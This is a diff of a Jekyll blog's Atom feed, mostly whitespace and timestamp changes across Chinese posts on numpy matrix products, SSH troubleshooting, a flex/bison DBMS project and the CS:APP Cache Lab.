@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="https://iamnotphage.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://iamnotphage.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2025-02-28T07:54:15+00:00</updated><id>https://iamnotphage.github.io/feed.xml</id><title type="html">blank</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. </subtitle><entry><title type="html">向量和矩阵各种乘积以及其对应的numpy库API解释</title><link href="https://iamnotphage.github.io/blog/2025/%E7%9F%A9%E9%98%B5%E4%B9%98%E6%B3%95%E7%AC%A6%E5%8F%B7%E5%92%8CNumpy%E8%A7%A3%E9%87%8A/" rel="alternate" type="text/html" title="向量和矩阵各种乘积以及其对应的numpy库API解释"/><published>2025-02-27T00:00:00+00:00</published><updated>2025-02-27T00:00:00+00:00</updated><id>https://iamnotphage.github.io/blog/2025/%E7%9F%A9%E9%98%B5%E4%B9%98%E6%B3%95%E7%AC%A6%E5%8F%B7%E5%92%8CNumpy%E8%A7%A3%E9%87%8A</id><content type="html" xml:base="https://iamnotphage.github.io/blog/2025/%E7%9F%A9%E9%98%B5%E4%B9%98%E6%B3%95%E7%AC%A6%E5%8F%B7%E5%92%8CNumpy%E8%A7%A3%E9%87%8A/"><![CDATA[<p>在学习cs231n关于反向传播矩阵求导的时候发现这部分内容非常绕，并且numpy对应的接口也有很多，在这里记录笔记分辨各类矩阵乘法的内容。</p> <p>下面主要解释各类乘积的别名、常用符号、含义以及对应的常用的numpy接口。</p> <blockquote> <p>本文暂不考虑复数域的情况，并且将严格按照wikipedia的定义以及<a href="https://numpy.org/doc/stable/reference/routines.linalg.html">numpy API reference</a>阐述</p> </blockquote> <h1 id="前置知识">前置知识</h1> <p>首先有必要指出几个必须认识的名词:</p> <ul> <li>标量: scalar</li> <li>向量: vector</li> <li>矩阵: matrix</li> <li>张量: tensor (区别于物理学上的张量)</li> </ul> <p>此外<code class="language-plaintext highlighter-rouge">numpy</code>库中经常声明类型为<code class="language-plaintext highlighter-rouge">ndarray</code>的变量，在阅读之前，有必要了解其中的属性。</p> <ol> <li>shape: 通常是一个元组，如果是(,N)或者(N,)则代表向量 (N,M)代表二维的矩阵</li> <li>ndim: 这个<code class="language-plaintext highlighter-rouge">ndarray</code>的维度</li> </ol> <p>比如:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="n">numpy</span> <span class="k">as</span> <span class="n">np</span>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="https://iamnotphage.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://iamnotphage.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2025-03-17T03:55:12+00:00</updated><id>https://iamnotphage.github.io/feed.xml</id><title type="html">blank</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. </subtitle><entry><title type="html">向量和矩阵各种乘积以及其对应的numpy库API解释</title><link href="https://iamnotphage.github.io/blog/2025/%E7%9F%A9%E9%98%B5%E4%B9%98%E6%B3%95%E7%AC%A6%E5%8F%B7%E5%92%8CNumpy%E8%A7%A3%E9%87%8A/" rel="alternate" type="text/html" title="向量和矩阵各种乘积以及其对应的numpy库API解释"/><published>2025-02-27T00:00:00+00:00</published><updated>2025-02-27T00:00:00+00:00</updated><id>https://iamnotphage.github.io/blog/2025/%E7%9F%A9%E9%98%B5%E4%B9%98%E6%B3%95%E7%AC%A6%E5%8F%B7%E5%92%8CNumpy%E8%A7%A3%E9%87%8A</id><content type="html" xml:base="https://iamnotphage.github.io/blog/2025/%E7%9F%A9%E9%98%B5%E4%B9%98%E6%B3%95%E7%AC%A6%E5%8F%B7%E5%92%8CNumpy%E8%A7%A3%E9%87%8A/"><![CDATA[<p>在学习cs231n关于反向传播矩阵求导的时候发现这部分内容非常绕，并且numpy对应的接口也有很多，在这里记录笔记分辨各类矩阵乘法的内容。</p> <p>下面主要解释各类乘积的别名、常用符号、含义以及对应的常用的numpy接口。</p> <blockquote> <p>本文暂不考虑复数域的情况，并且将严格按照wikipedia的定义以及<a href="https://numpy.org/doc/stable/reference/routines.linalg.html">numpy API reference</a>阐述</p> </blockquote> <h1 id="前置知识">前置知识</h1> <p>首先有必要指出几个必须认识的名词:</p> <ul> <li>标量: scalar</li> <li>向量: vector</li> <li>矩阵: matrix</li> <li>张量: tensor (区别于物理学上的张量)</li> </ul> <p>此外<code class="language-plaintext highlighter-rouge">numpy</code>库中经常声明类型为<code class="language-plaintext highlighter-rouge">ndarray</code>的变量，在阅读之前，有必要了解其中的属性。</p> <ol> <li>shape: 通常是一个元组，如果是(,N)或者(N,)则代表向量 (N,M)代表二维的矩阵</li> <li>ndim: 这个<code class="language-plaintext highlighter-rouge">ndarray</code>的维度</li> </ol> <p>比如:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="n">numpy</span> <span class="k">as</span> <span class="n">np</span>
 <span class="o">&gt;&gt;&gt;</span> <span class="n">a</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="nf">array</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">])</span>
 <span class="o">&gt;&gt;&gt;</span> <span class="n">a</span><span class="p">.</span><span class="n">shape</span>
 <span class="p">(</span><span class="mi">3</span><span class="p">,)</span>
@@ -40,13 +40,13 @@
 </span><span class="mi">2</span>
 </code></pre></div></div> <p>前两个<code class="language-plaintext highlighter-rouge">np.dot</code>和<code class="language-plaintext highlighter-rouge">np.inner</code>根据函数名也容易理解是在计算点乘（内积）</p> <p>并且<code class="language-plaintext highlighter-rouge">numpy</code>文档也写的很清楚:</p> <p>(下文的<code class="language-plaintext highlighter-rouge">1-D arrays</code>指的是维度为<code class="language-plaintext highlighter-rouge">1</code>的<code class="language-plaintext highlighter-rouge">ndarray</code>，也就是所谓的<code class="language-plaintext highlighter-rouge">vector</code>)</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">numpy</span><span class="p">.</span><span class="nf">dot</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">out</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
 <span class="c1"># Dot product of two arrays. Specifically,
-# If both a and b are 1-D arrays, it is 
+# If both a and b are 1-D arrays, it is
 # inner product of vectors (without complex conjugation).
 </span>
 <span class="n">numpy</span><span class="p">.</span><span class="nf">inner</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="o">/</span><span class="p">)</span>
 <span class="c1"># Inner product of two arrays.
-# Ordinary inner product of vectors for 1-D arrays 
-# (without complex conjugation), in higher dimensions a 
+# Ordinary inner product of vectors for 1-D arrays
+# (without complex conjugation), in higher dimensions a
 # sum product over the last axes.
 </span></code></pre></div></div> <p>但是为什么后面两个，<code class="language-plaintext highlighter-rouge">np.matmul</code>和<code class="language-plaintext highlighter-rouge">@</code>运算符却同样能给出点乘答案？</p> <p>首先，<code class="language-plaintext highlighter-rouge">@</code>运算符等价于<code class="language-plaintext highlighter-rouge">np.matmul</code>，所以这里解释<code class="language-plaintext highlighter-rouge">np.matmul</code>:</p> <blockquote> <p>If the first argument is 1-D, it is promoted to a matrix by <strong>prepending</strong> a 1 to its dimensions. After matrix multiplication the prepended 1 is removed. (For stacks of vectors, use vecmat.)</p> </blockquote> <blockquote> <p>If the second argument is 1-D, it is promoted to a matrix by <strong>appending</strong> a 1 to its dimensions. After matrix multiplication the appended 1 is removed. (For stacks of vectors, use matvec.)</p> </blockquote> <p>注意这里的<code class="language-plaintext highlighter-rouge">prepending</code>和<code class="language-plaintext highlighter-rouge">appending</code></p> <p>这里说了，如果第一个参数是<code class="language-plaintext highlighter-rouge">1-D</code>也就是一维的话，那么会<code class="language-plaintext highlighter-rouge">prepending</code>一个<code class="language-plaintext highlighter-rouge">1</code>扩充成矩阵，变成<code class="language-plaintext highlighter-rouge">shape</code>为<code class="language-plaintext highlighter-rouge">(1,N)</code></p> <p>第二个参数是<code class="language-plaintext highlighter-rouge">1-D</code>也就是一维的话，那么会<code class="language-plaintext highlighter-rouge">appending</code>一个<code class="language-plaintext highlighter-rouge">1</code>扩充成矩阵，变成<code class="language-plaintext highlighter-rouge">shape</code>为<code class="language-plaintext highlighter-rouge">(N,1)</code></p> <p>那么这里不就恰好变成两个矩阵相乘得到<code class="language-plaintext highlighter-rouge">(1,1)</code>的矩阵，同时移除这个维度，变成了一个<code class="language-plaintext highlighter-rouge">scalar</code>也就是标量</p> <p>所以严格来说，不是<code class="language-plaintext highlighter-rouge">numpy.matmul</code>和<code class="language-plaintext highlighter-rouge">@</code>能计算点乘，而是因为<code class="language-plaintext highlighter-rouge">matmul</code>对一维输入的特殊处理，恰好算出来点乘。</p> <h1 id="叉乘">叉乘</h1> <p>叉乘(<strong>cross product</strong>)同样是定义在<strong>两个向量</strong>之间的运算，是对三维空间中的<strong>两个向量</strong>的二元运算，所以矩阵之间也是不存在叉乘的说法的</p> <table> <thead> <tr> <th>别名</th> <th>英文</th> <th>数学符号</th> <th>numpy API</th> </tr> </thead> <tbody> <tr> <td><strong>叉积</strong>、<strong>外积</strong>、向量积</td> <td><strong>cross product</strong>、external product、vector product、<strong>outer product</strong></td> <td>$a\times b$、$a \otimes b$</td> <td><code class="language-plaintext highlighter-rouge">numpy.cross</code>、<code class="language-plaintext highlighter-rouge">numpy.outer</code></td> </tr> </tbody> </table> <p>叉乘在数学上定义如下:</p> \[\mathbf{a} \times \mathbf{b} = \| \mathbf{a} \| \| \mathbf{b} \| \sin(\theta) \ \mathbf{n}\] <p>也就是通过右手法则求出第三个向量，垂直于 $a$ 和 $b$</p> <p><strong>但是！这里有一个混淆的点！</strong></p> <ul> <li> <p><strong>叉积</strong>(<strong>cross product</strong>)才是上面数学定义的，求 $a$ 和 $b$ 所在平面的<strong>法向量</strong>。对应符号 $a \times b$。<code class="language-plaintext highlighter-rouge">numpy</code>中使用<code class="language-plaintext highlighter-rouge">numpy.cross()</code>来计算。</p> </li> <li> <p><strong>外积</strong>(<strong>outer product</strong>)是另一个概念！在线性代数中一般指两个向量的<a href="https://zh.wikipedia.org/wiki/%E5%A4%96%E7%A7%AF_(%E5%BC%A0%E9%87%8F%E7%A7%AF)"><strong>张量积</strong></a>，其结果为一<strong>矩阵</strong>；与外积相对，两向量的内积结果为标量。外积也可视作是矩阵的<a href="https://zh.wikipedia.org/wiki/%E5%85%8B%E7%BD%97%E5%86%85%E5%85%8B%E7%A7%AF"><strong>Kronecker积</strong></a>的一种特例。也就是 $a \otimes b$。<code class="language-plaintext highlighter-rouge">numpy</code>中使用<code class="language-plaintext highlighter-rouge">numpy.outer()</code>来计算。</p> </li> </ul> <p>这两个名词常有混在一起，我推荐直接使用英文名，或者根据其输出结果来分辨。</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">a</span>
 <span class="nf">array</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">])</span>
@@ -175,14 +175,14 @@ OpenSSH SSH Server 服务无法启动。
 进程意外终止。
 </code></pre></div></div> <p><strong>解决方案</strong></p> <ol> <li>首先确保权限正确: 在<code class="language-plaintext highlighter-rouge">.\FixHostFilePermission.ps</code></li> <li>如果1不行那就删除<code class="language-plaintext highlighter-rouge">C:/ProgramData/ssh</code>文件夹，重新运行指令。</li> </ol> <h2 id="permission-denied">Permission Denied</h2> <p>一直没啥变化但是突然不行了</p> <p>客户端确保公钥正确上传到服务器的<code class="language-plaintext highlighter-rouge">authorized_keys</code></p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen <span class="nt">-R</span> <span class="o">[</span>name] <span class="c"># 这里填写自己的域名</span>
 <span class="c"># 这里会清除 ~/.ssh/known_hosts的相关条目</span>
-</code></pre></div></div> <p>是在不行就删除<code class="language-plaintext highlighter-rouge">C:/ProgramData/ssh</code>文件夹重启sshd服务。</p>]]></content><author><name></name></author><category term="杂项"/><category term="ssh"/><category term="tutorial"/><summary type="html"><![CDATA[本文描述了ssh相关知识，ssh远程连接服务器步骤，以及所有坑的解决方案]]></summary></entry><entry><title type="html">my DBMS</title><link href="https://iamnotphage.github.io/blog/2024/myDBMS/" rel="alternate" type="text/html" title="my DBMS"/><published>2024-05-17T15:59:00+00:00</published><updated>2024-05-17T15:59:00+00:00</updated><id>https://iamnotphage.github.io/blog/2024/myDBMS</id><content type="html" xml:base="https://iamnotphage.github.io/blog/2024/myDBMS/"><![CDATA[<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  /$$$$$$  /$$   /$$ /$$$$$$$$ /$$   /$$      
- /$$__  $$| $$  | $$| $$_____/| $$$ | $$      
-| $$  \__/| $$  | $$| $$      | $$$$| $$      
-| $$      | $$$$$$$$| $$$$$   | $$ $$ $$      
-| $$      | $$__  $$| $$__/   | $$  $$$$      
-| $$    $$| $$  | $$| $$      | $$\  $$$      
-|  $$$$$$/| $$  | $$| $$$$$$$$| $$ \  $$      
- \______/ |__/  |__/|________/|__/  \__/ 
+</code></pre></div></div> <p>是在不行就删除<code class="language-plaintext highlighter-rouge">C:/ProgramData/ssh</code>文件夹重启sshd服务。</p>]]></content><author><name></name></author><category term="杂项"/><category term="ssh"/><category term="tutorial"/><summary type="html"><![CDATA[本文描述了ssh相关知识，ssh远程连接服务器步骤，以及所有坑的解决方案]]></summary></entry><entry><title type="html">my DBMS</title><link href="https://iamnotphage.github.io/blog/2024/myDBMS/" rel="alternate" type="text/html" title="my DBMS"/><published>2024-05-17T15:59:00+00:00</published><updated>2024-05-17T15:59:00+00:00</updated><id>https://iamnotphage.github.io/blog/2024/myDBMS</id><content type="html" xml:base="https://iamnotphage.github.io/blog/2024/myDBMS/"><![CDATA[<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  /$$$$$$  /$$   /$$ /$$$$$$$$ /$$   /$$
+ /$$__  $$| $$  | $$| $$_____/| $$$ | $$
+| $$  \__/| $$  | $$| $$      | $$$$| $$
+| $$      | $$$$$$$$| $$$$$   | $$ $$ $$
+| $$      | $$__  $$| $$__/   | $$  $$$$
+| $$    $$| $$  | $$| $$      | $$\  $$$
+|  $$$$$$/| $$  | $$| $$$$$$$$| $$ \  $$
+ \______/ |__/  |__/|________/|__/  \__/
 </code></pre></div></div> <p>设计并实现一个DBMS原型系统，可以接受基本的SQL语句，对其进行词法分析、语法分析，然后解释执行SQL语句，完成对数据库文件的相应操作，实现DBMS的基本功能。</p> <p>ps: 以下<code class="language-plaintext highlighter-rouge">教科书</code>特指<code class="language-plaintext highlighter-rouge">西电出版社的《编译原理》</code></p> <h1 id="效果演示">效果演示</h1> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-05-17/demo-480.webp 480w,/assets/img/2024-05-17/demo-800.webp 800w,/assets/img/2024-05-17/demo-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-05-17/demo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h1 id="环境说明">环境说明</h1> <ul> <li>windows11</li> <li>GCC/G++ 8.1.0</li> <li>Lex(Flex) 2.5.4a</li> <li>YACC(Bison) 2.4.1</li> <li>CLion 2023</li> <li>VSCode 插件<code class="language-plaintext highlighter-rouge">Yash</code>可以高亮Lex和YACC语法</li> </ul> <p>lex和yacc在UNIX中是标配，所以windows用户需要自己去下载，而linux或者macos用户会方便一些。</p> <p>下面贴出GNU官方的下载地址。</p> <p><a href="https://gnuwin32.sourceforge.net/packages/flex.htm">Flex Download</a></p> <p><a href="https://gnuwin32.sourceforge.net/packages/bison.htm">Bison Download</a></p> <p>安装之后需要配置环境变量，将<code class="language-plaintext highlighter-rouge">bin</code>目录添加到系统环境变量就行了。</p> <p>配置好环境变量后，cmd终端能够找到<code class="language-plaintext highlighter-rouge">bison.exe</code>和<code class="language-plaintext highlighter-rouge">flex.exe</code>，所以能够执行命令，查看一下版本号看看配置是否正确。</p> <h1 id="前置知识">前置知识</h1> <ol> <li>CMake相关的前置知识: <a href="https://www.jetbrains.com/help/clion/quick-cmake-tutorial.html">Quick CMake Tutorial</a></li> <li>正则表达式: <a href="https://ftp.gnu.org/old-gnu/Manuals/flex-2.5.4/html_mono/flex.html#SEC7">flex官方说明</a> 或教科书</li> <li>Lex程序基本结构: <a href="https://ftp.gnu.org/old-gnu/Manuals/flex-2.5.4/html_mono/flex.html#SEC5">简单程序演示</a> 或教科书2.5章</li> <li>YACC程序基本结构: <a href="https://www.gnu.org/software/bison/manual/bison.html#Examples">YACC官方文档</a></li> </ol> <h1 id="lex源程序说明">Lex源程序说明</h1> <p>Lex用来生成<code class="language-plaintext highlighter-rouge">词法分析器</code>（词法分析器生成器），能识别正规式，并执行给定的动作。输出的文件是<code class="language-plaintext highlighter-rouge">.yy.c</code>后缀。</p> <h2 id="lex源程序结构">Lex源程序结构</h2> <p>Lex源程序的结构被<code class="language-plaintext highlighter-rouge">%%</code>符号分为三/四部分(查看教科书2.5章):</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">%</span><span class="p">{</span>
 <span class="n">Declarations</span>
 <span class="o">%</span><span class="p">}</span>
@@ -241,7 +241,7 @@ OpenSSH SSH Server 服务无法启动。
 <span class="n">queryStatement</span><span class="o">:</span>
     <span class="n">SELECT</span> <span class="n">columnName</span> <span class="n">FROM</span> <span class="n">tableName</span> <span class="sc">';'</span>
     <span class="p">;</span>
-    
+
 <span class="c1">//如果后面还有文法产生式，也将因为无法从S推导，而无法识别</span>
 </code></pre></div></div> <p>如果先读取到了<code class="language-plaintext highlighter-rouge">SELECT</code>语句，将无法识别，因为一切语法分析要从第一条产生式开始。</p> <p>所以在上述例子中，最好是这样定义Productions段:</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Productions段</span>
 <span class="n">statements</span><span class="o">:</span>
@@ -385,16 +385,16 @@ g++ <span class="nt">-o</span> lex.yy.c test.tab.c main.cpp
 <span class="p">}</span>
 </code></pre></div></div> <p>自己注意就行，总之能够调用这两个函数就可以了。</p> <p>如果要在<code class="language-plaintext highlighter-rouge">parser.y</code>中用到cpp的某些特性，比如类或者某些集合，那么你就需要保证你用<code class="language-plaintext highlighter-rouge">lex</code>和<code class="language-plaintext highlighter-rouge">yacc</code>编译的文件是<code class="language-plaintext highlighter-rouge">.cpp/.hpp</code>的，从而尽量避免C和CPP混合编程带来的<code class="language-plaintext highlighter-rouge">undefine reference</code>的链接问题。</p> <p>要么纯C要么纯CPP，C和CPP混合的话，还是挺麻烦的，除非你能做到完美分离前后端。</p> <p>如果你要纯CPP的话，<code class="language-plaintext highlighter-rouge">flex</code>源文件可以在开头加上<code class="language-plaintext highlighter-rouge">%option outfile = "lex.yy.cpp"</code>，这样<code class="language-plaintext highlighter-rouge">flex lex.l</code>编译出来的文件就是<code class="language-plaintext highlighter-rouge">lex.yy.cpp</code>(可改名)</p> <p>使用<code class="language-plaintext highlighter-rouge">yyparse()</code>和<code class="language-plaintext highlighter-rouge">yy_scan_string()</code>的话，就不用加上<code class="language-plaintext highlighter-rouge">extern "C"</code>的关键字了。</p> <h1 id="数据库设计">数据库设计</h1> <h2 id="mydbms-architecture">myDBMS Architecture</h2> <p>概览如下图:</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-05-17/myArchitecture-480.webp 480w,/assets/img/2024-05-17/myArchitecture-800.webp 800w,/assets/img/2024-05-17/myArchitecture-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-05-17/myArchitecture.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p><code class="language-plaintext highlighter-rouge">Shell</code>和<code class="language-plaintext highlighter-rouge">Compiler</code>部分属于<code class="language-plaintext highlighter-rouge">Front-End</code>部分。</p> <p><code class="language-plaintext highlighter-rouge">Engine</code>以及后续的部分属于<code class="language-plaintext highlighter-rouge">Back-End</code>部分。</p> <p>这一点参考的官方<a href="https://www.sqlite.org/arch.html">Architecture of SQLite</a></p> <h2 id="编译器设计">编译器设计</h2> <h3 id="tokenizer">Tokenizer</h3> <p>lex程序比较简单，没什么特别需要注意的地方，本人遇到的两个bug需要注意。</p> <p>一个是关于NUMBER的正则表达式，之前使用的是:</p> <p><code class="language-plaintext highlighter-rouge">[-+]?[1-9][0-9]*</code>，其实这个表达式不包含0，一定要注意多测试前端的问题。</p> <p>后续修复这样:</p> <p><code class="language-plaintext highlighter-rouge">[-+]?[0-9]+</code></p> <p>另一个是关于STRING的正则表达式，很容易想到:</p> <p><code class="language-plaintext highlighter-rouge">'.*'</code></p> <p>也就是两个单引号包含一个任意字符闭包。</p> <p>看起来没什么问题，但是实际上如果出现多个字符:</p> <p><code class="language-plaintext highlighter-rouge">SELECT * FROM table WHERE name = 'test' AND money = 'infinity';</code></p> <p>将会出现难以调试的bug。有可能会把<code class="language-plaintext highlighter-rouge">test' AND money = 'infinity</code>作为两个单引号的内容，导致bug。</p> <p>建议改成:</p> <p><code class="language-plaintext highlighter-rouge">"'"[^']*"'"</code></p> <h3 id="parser">Parser</h3> <p>在YACC程序，语法分析主要写一些文法产生式，还有对应的规则。</p> <p>我设计语句如下：</p> <p>开始语句为<code class="language-plaintext highlighter-rouge">startStatement</code>，其语法树如下:</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-05-17/startStatement-480.webp 480w,/assets/img/2024-05-17/startStatement-800.webp 800w,/assets/img/2024-05-17/startStatement-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-05-17/startStatement.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>分为六大部分，<code class="language-plaintext highlighter-rouge">systemControl</code>,<code class="language-plaintext highlighter-rouge">createStatement</code>,<code class="language-plaintext highlighter-rouge">queryStatement</code>,<code class="language-plaintext highlighter-rouge">insertStatement</code>,<code class="language-plaintext highlighter-rouge">updateStatement</code>,<code class="language-plaintext highlighter-rouge">deleteStatement</code>。</p> <h4 id="systemcontrol">systemControl</h4> <p>主要是对数据库和表进行创建、删除、使用、列举:</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* System-Control Statements */</span>
 <span class="n">systemControl</span><span class="o">:</span>
-	<span class="n">CREATE</span> <span class="n">DATABASE</span> <span class="n">databaseName</span> <span class="sc">';'</span>	
-	<span class="o">|</span> <span class="n">SHOW</span> <span class="n">DATABASES</span> <span class="sc">';'</span>				
-	<span class="o">|</span> <span class="n">USE</span> <span class="n">databaseName</span> <span class="sc">';'</span>				
-	<span class="o">|</span> <span class="n">DROP</span> <span class="n">DATABASE</span> <span class="n">databaseName</span> <span class="sc">';'</span>	
-	<span class="o">|</span> <span class="n">SHOW</span> <span class="n">TABLES</span> <span class="sc">';'</span>					
-	<span class="o">|</span> <span class="n">DROP</span> <span class="n">TABLE</span> <span class="n">tableName</span> <span class="sc">';'</span>			
+	<span class="n">CREATE</span> <span class="n">DATABASE</span> <span class="n">databaseName</span> <span class="sc">';'</span>
+	<span class="o">|</span> <span class="n">SHOW</span> <span class="n">DATABASES</span> <span class="sc">';'</span>
+	<span class="o">|</span> <span class="n">USE</span> <span class="n">databaseName</span> <span class="sc">';'</span>
+	<span class="o">|</span> <span class="n">DROP</span> <span class="n">DATABASE</span> <span class="n">databaseName</span> <span class="sc">';'</span>
+	<span class="o">|</span> <span class="n">SHOW</span> <span class="n">TABLES</span> <span class="sc">';'</span>
+	<span class="o">|</span> <span class="n">DROP</span> <span class="n">TABLE</span> <span class="n">tableName</span> <span class="sc">';'</span>
 	<span class="p">;</span>
 
 <span class="n">databaseName</span><span class="o">:</span>
-	<span class="n">ID</span>									
+	<span class="n">ID</span>
 	<span class="p">;</span>
 
 <span class="n">tableName</span><span class="o">:</span>
@@ -591,7 +591,7 @@ g++ <span class="nt">-o</span> lex.yy.c test.tab.c main.cpp
     <span class="kt">void</span> <span class="n">insert</span><span class="p">(</span><span class="k">struct</span> <span class="nc">insertNode</span><span class="o">*</span> <span class="n">node</span><span class="p">);</span>
     <span class="kt">void</span> <span class="n">update</span><span class="p">(</span><span class="k">struct</span> <span class="nc">updateNode</span><span class="o">*</span> <span class="n">node</span><span class="p">);</span>
     <span class="kt">void</span> <span class="n">deleteFrom</span><span class="p">(</span><span class="k">struct</span> <span class="nc">deleteNode</span><span class="o">*</span> <span class="n">node</span><span class="p">);</span>
-    
+
 <span class="nl">private:</span>
     <span class="kt">int</span> <span class="n">currentState</span><span class="p">;</span> <span class="c1">// 当前系统状态</span>
     <span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">dataPath</span> <span class="o">=</span> <span class="s">"../data"</span><span class="p">;</span>
@@ -635,9 +635,9 @@ g++ <span class="nt">-o</span> lex.yy.c test.tab.c main.cpp
     <span class="kt">bool</span> <span class="n">isDirty</span><span class="p">;</span>
     <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;</span> <span class="n">pageDirectory</span><span class="p">;</span> <span class="c1">// 页目录存储记录的偏移量</span>
     <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="n">Record</span><span class="o">&gt;</span> <span class="n">records</span><span class="p">;</span> <span class="c1">// 当前页的记录</span>
-    
+
     <span class="n">Pager</span><span class="p">(</span><span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&amp;</span> <span class="n">filePath</span><span class="p">);</span> <span class="c1">// 初始化时从外存读页</span>
-    
+
     <span class="n">Pager</span><span class="o">*</span> <span class="n">readPage</span><span class="p">(</span><span class="kt">int</span> <span class="n">ID</span><span class="p">);</span> <span class="c1">// 将页从外存读入内存，这里还没实现BTree，先根据path读文件，遍历页来找目标id所在的页</span>
     <span class="kt">void</span> <span class="n">writePage</span><span class="p">();</span> <span class="c1">// 页的状态设为DIRTY，并在内存中更新页</span>
     <span class="kt">bool</span> <span class="n">isFull</span><span class="p">();</span>
@@ -965,21 +965,21 @@ exit
 
 </code></pre></div></div>]]></content><author><name></name></author><category term="西电相关"/><category term="项目"/><category term="c"/><category term="TI-RSLK"/><category term="嵌入式"/><summary type="html"><![CDATA[西电双创周小项目:自动循迹小车实现]]></summary></entry><entry><title type="html">CS:APP3e Cache Lab</title><link href="https://iamnotphage.github.io/blog/2022/CSAPP3eCache/" rel="alternate" type="text/html" title="CS:APP3e Cache Lab"/><published>2022-06-04T15:59:00+00:00</published><updated>2022-06-04T15:59:00+00:00</updated><id>https://iamnotphage.github.io/blog/2022/CSAPP3eCache</id><content type="html" xml:base="https://iamnotphage.github.io/blog/2022/CSAPP3eCache/"><![CDATA[<p>在开始之前，先确保阅读CS:APPe3的第六章(尤其是<code class="language-plaintext highlighter-rouge">6.2</code>, <code class="language-plaintext highlighter-rouge">6.3</code>, <code class="language-plaintext highlighter-rouge">6.4</code>)</p> <p>(关于SRAM和DRAM部分的文字和我看过的国内教材神似，很难不怀疑是不是抄袭CSAPP的)</p> <p>然后就对高速缓存的结构有了新认识: (S, E, B, m)元组表示</p> <p>先阅读一下<code class="language-plaintext highlighter-rouge">writeup</code>发现有个内存调试工具<code class="language-plaintext highlighter-rouge">valgrind</code></p> <p>在docker运行的容器里面安装一下必要的内容(根据你的情况决定)</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>yum <span class="nb">install </span>valgrind
 yum <span class="nb">install </span>python2  <span class="c"># 后续./driver.py时是python2</span>
-</code></pre></div></div> <h1 id="part-a">Part A</h1> <p>在<code class="language-plaintext highlighter-rouge">writeup</code>中给出了例子:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@5fd2dc6af315 cache]# ./csim-ref <span class="nt">-v</span> <span class="nt">-s</span> 4 <span class="nt">-E</span> 1 <span class="nt">-b</span> 4 <span class="nt">-t</span> traces/yi.trace 
-L 10,1 miss 
-M 20,1 miss hit 
-L 22,1 hit 
-S 18,1 hit 
-L 110,1 miss eviction 
-L 210,1 miss eviction 
-M 12,1 miss eviction hit 
+</code></pre></div></div> <h1 id="part-a">Part A</h1> <p>在<code class="language-plaintext highlighter-rouge">writeup</code>中给出了例子:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@5fd2dc6af315 cache]# ./csim-ref <span class="nt">-v</span> <span class="nt">-s</span> 4 <span class="nt">-E</span> 1 <span class="nt">-b</span> 4 <span class="nt">-t</span> traces/yi.trace
